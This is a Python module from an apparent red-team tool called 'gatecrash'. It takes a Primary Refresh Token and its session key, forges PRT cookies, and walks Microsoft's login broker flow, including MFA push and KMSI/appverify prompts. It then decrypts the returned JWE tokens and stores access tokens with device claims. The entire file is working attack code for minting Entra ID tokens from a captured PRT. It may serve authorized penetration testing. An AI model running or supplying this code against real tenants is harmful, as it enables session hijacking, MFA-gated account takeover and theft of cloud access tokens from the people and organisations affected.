"""Module 3: PRT broker authentication + JWE decrypt.

Flow: load PRT -> srv_challenge nonce -> PRT cookie (KDF v2) -> authorize with broker client
and X-Ms-Refreshtokencredential header -> (SSO code | MFA) -> appverify/KMSI speedbumps ->
auth code -> token exchange (windows_api_version=2.2 => JWE) -> decrypt with session key.

Needs a PRT: config `prt_path` points at a roadtx.prt JSON ({refresh_token, session_key}).
Get one from Module 2 (device-reg) or roadtx.
"""
import json
import os
import time

import requests

from lib import clients
from lib.jwe import decrypt_jwe, is_jwe
from lib.kdf import create_prt_cookie, sign_prt_request
from lib.logger import logged_session, get as get_log
from lib.util import LOGIN, decode_jwt, extract_code, extract_from_html, server_nonce
from modules import mfa_handler
from modules.token_ops import store_token

BROKER = clients.BROKER_CLIENT
BROKER_REDIRECT = clients.BROKER_REDIRECT
BROKER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView/3.0) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19044")


def load_prt(cfg):
    """Load PRT token + session key bytes from config.prt_path (roadtx.prt format)."""
    path = cfg.prt_path
    if not path or not os.path.exists(path):
        raise SystemExit("[prt] No PRT. Set prt_path in config (roadtx.prt) or run device-reg first.")
    with open(path, encoding="utf-8") as f:
        prt = json.load(f)
    session_key = prt.get("session_key")
    if cfg.session_key_path and os.path.exists(cfg.session_key_path):
        with open(cfg.session_key_path, encoding="utf-8") as f:
            session_key = f.read().strip()
    if not prt.get("refresh_token") or not session_key:
        raise SystemExit("[prt] PRT file missing refresh_token or session_key.")
    return prt["refresh_token"], bytes.fromhex(session_key)


def _cookie(session, cfg, prt_token, session_key):
    nonce = server_nonce(session, cfg.tenant_id)
    return create_prt_cookie(prt_token, session_key, nonce), nonce


def _authorize(session, cfg, resource, cookie):
    return session.get(
        f"{LOGIN}/{cfg.tenant_id}/oauth2/authorize",
        params={"client_id": BROKER, "response_type": "code", "redirect_uri": BROKER_REDIRECT,
                "resource": resource, "scope": "openid", "login_hint": cfg.username,
                "response_mode": "form_post", "windows_api_version": "2.0",
                "amr_values": "ngcmfa", "add_account": "noheadsup"},
        headers={"X-Ms-Refreshtokencredential": cookie}, allow_redirects=True, timeout=30)


def run(cfg, eng, args):
    log = get_log()
    resource = clients.v1_resource(getattr(args, "resource", "drs"), cfg.sharepoint_host)
    log.info(f"[prt] === PRT Broker Flow ===")
    log.info(f"[prt] Target resource: {resource}")
    prt_token, session_key = load_prt(cfg)
    log.info(f"[prt] PRT loaded (token length: {len(prt_token)}, session key: {len(session_key)} bytes)")

    session = logged_session("prt-broker")
    session.headers.update({"User-Agent": BROKER_UA})

    log.info("[prt] Building PRT cookie (KBKDFHMAC v2)...")
    cookie, _ = _cookie(session, cfg, prt_token, session_key)
    log.info("[prt] Sending authorize request with PRT cookie...")
    resp = _authorize(session, cfg, resource, cookie)
    html = resp.text
    err = extract_from_html(html, "stsErrorCode") or ""
    ft = extract_from_html(html, "sFT")
    ctx = extract_from_html(html, "sCtx")
    log.info(f"[prt] Authorize response: error={err or 'none'}, flowToken={'yes' if ft else 'NO'}")

    code = extract_code(html)
    if code:
        print("[prt] SSO succeeded without MFA.")
    elif ft:
        code = _do_mfa(session, cfg, prt_token, session_key, ctx, ft)
    if not code:
        code = _code_from_history(resp)
    if not code:
        eng.save_evidence("prt_no_code.html", html)
        raise SystemExit("[prt] No auth code. Page saved to evidence.")

    print("[prt] Exchanging code for token...")
    tok = _exchange(session, cfg, code, resource, prt_token, session_key)
    if "access_token" not in tok:
        raise SystemExit(f"[prt] Token exchange failed: {tok.get('error_description', tok)}")

    name = getattr(args, "resource", "drs")
    saved = store_token(eng, name, tok, cfg, source="gatecrash", meta={"method": "prt_broker"})
    claims = decode_jwt(tok["access_token"])
    print(f"[prt] TOKEN: aud={claims.get('aud')} amr={claims.get('amr')} "
          f"deviceid={claims.get('deviceid', 'NONE')} upn={claims.get('upn')}")
    print(f"[prt] -> {saved}")
    return {"token": saved, "deviceid": claims.get("deviceid")}


def _do_mfa(session, cfg, prt_token, session_key, ctx, ft):
    """MFA push, then ProcessAuth with a FRESH PRT cookie, then clear speedbumps."""
    print("[prt] MFA required.")
    # Retry BeginAuth on DuplicateRequest with a refreshed authorize page.
    begin = None
    for attempt in range(6):
        try:
            begin = mfa_handler.begin_auth(session, ctx, ft)
            break
        except mfa_handler.MfaDuplicate:
            print(f"[prt] BeginAuth duplicate; waiting 30s then refreshing (attempt {attempt + 1})")
            time.sleep(30)
            cookie, _ = _cookie(session, cfg, prt_token, session_key)
            resource = clients.v1_resource(getattr(cfg, "_resource", "drs"), cfg.sharepoint_host) \
                if hasattr(cfg, "_resource") else clients.v1_resource("drs")
            r = _authorize(session, cfg, resource, cookie)
            ctx = extract_from_html(r.text, "sCtx") or ctx
            ft = extract_from_html(r.text, "sFT") or ft
    if not begin:
        raise SystemExit("[prt] BeginAuth kept failing (duplicate).")

    from lib.util import write_mfa_number
    write_mfa_number(begin.get("Entropy"), cfg.mfa_number_file)
    ctx2, ft2 = mfa_handler.poll_end_auth(session, begin.get("SessionId"),
                                          begin.get("FlowToken", ft), begin.get("Ctx", ctx),
                                          timeout=cfg.mfa_timeout)

    fresh_cookie, _ = _cookie(session, cfg, prt_token, session_key)
    resp = mfa_handler.process_auth(session, ctx2, ft2, prt_cookie=fresh_cookie)
    html = resp.text
    code = extract_code(html)
    if code:
        return code
    return _clear_speedbumps(session, cfg, prt_token, session_key, html, ctx2, ft2, resp)


def _clear_speedbumps(session, cfg, prt_token, session_key, html, ctx, ft, last_resp):
    """Handle appverify (399218) then KMSI pages, up to 5 iterations."""
    canary = extract_from_html(html, "canary") or extract_from_html(html, "apiCanary")
    for _ in range(5):
        nft = extract_from_html(html, "sFT") or ft
        nctx = extract_from_html(html, "sCtx") or ctx
        ncanary = extract_from_html(html, "canary") or extract_from_html(html, "apiCanary") or canary
        if "appverify" in html:
            cookie, _ = _cookie(session, cfg, prt_token, session_key)
            html = session.post(f"{LOGIN}/appverify",
                                data={"ctx": nctx, "flowToken": nft, "canary": ncanary},
                                headers={"X-Ms-Refreshtokencredential": cookie},
                                allow_redirects=True, timeout=30).text
            continue
        if "kmsi" in html.lower() and nft:
            cookie, _ = _cookie(session, cfg, prt_token, session_key)
            html = session.post(f"{LOGIN}/common/login",
                                data={"LoginOptions": "1", "ctx": nctx, "flowToken": nft, "canary": ncanary},
                                headers={"X-Ms-Refreshtokencredential": cookie},
                                allow_redirects=True, timeout=30).text
            continue
        break
    return extract_code(html) or _code_from_history(last_resp)


def _code_from_history(resp):
    import re
    for r in getattr(resp, "history", []):
        loc = r.headers.get("Location", "")
        if "code=" in loc:
            return re.search(r"code=([^&]+)", loc).group(1)
    return None


def _exchange(session, cfg, code, resource, prt_token, session_key):
    """Standard exchange (2.2 => JWE). Fall back to jwt-bearer (payload inside signed JWT)."""
    r = requests.post(f"{LOGIN}/{cfg.tenant_id}/oauth2/token", data={
        "grant_type": "authorization_code", "client_id": BROKER, "code": code,
        "redirect_uri": BROKER_REDIRECT, "resource": resource,
        "windows_api_version": "2.2", "client_info": "1"}, timeout=30)
    text = r.text
    if is_jwe(text):
        return decrypt_jwe(text, session_key)
    if text.lstrip().startswith("{"):
        out = json.loads(text)
        if "access_token" in out:
            return out
    # Fallback: jwt-bearer. Gotcha #3: client_id/resource/redirect_uri go INSIDE the JWT.
    print("[prt] Standard exchange didn't yield a token; trying jwt-bearer.")
    nonce = server_nonce(session, cfg.tenant_id)
    payload = {"grant_type": "authorization_code", "code": code, "client_id": BROKER,
               "redirect_uri": BROKER_REDIRECT, "resource": resource, "scope": "openid",
               "iss": "aad:brokerplugin", "aud": "login.microsoftonline.com",
               "request_nonce": nonce, "iat": str(int(time.time())), "exp": str(int(time.time()) + 3600)}
    req_jwt = sign_prt_request(payload, session_key)
    r2 = requests.post(f"{LOGIN}/{cfg.tenant_id}/oauth2/token", data={
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "request": req_jwt,
        "windows_api_version": "2.2", "client_info": "1"}, timeout=30)
    t2 = r2.text
    if is_jwe(t2):
        return decrypt_jwe(t2, session_key)
    return json.loads(t2) if t2.lstrip().startswith("{") else {"error": "exchange_failed", "raw": t2[:300]}
